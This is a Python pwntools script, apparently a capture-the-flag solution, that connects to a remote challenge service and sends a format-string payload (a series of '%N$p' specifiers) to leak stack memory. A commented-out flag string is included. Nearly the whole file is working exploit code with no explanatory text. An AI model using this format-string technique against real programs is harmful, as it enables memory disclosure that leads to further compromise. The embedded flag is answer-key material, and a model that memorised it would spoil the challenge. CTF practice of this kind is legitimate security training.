#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug =2
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote("mc.ax",31569)
	# libc = ELF("./libc.so.6",checksec=False)

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

pd = 'please'
pd += '%70$p'
pd += '%71$p'
pd += '%72$p'
pd += '%73$p'
pd += '%74$p'
pd += '%75$p'
pd += '%76$p'
# gdb.attach(p,"b *$rebase(0x00001274)")
sla("what do you say?\n",pd)
#flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
# ying du
p.recvuntil("please")


ti()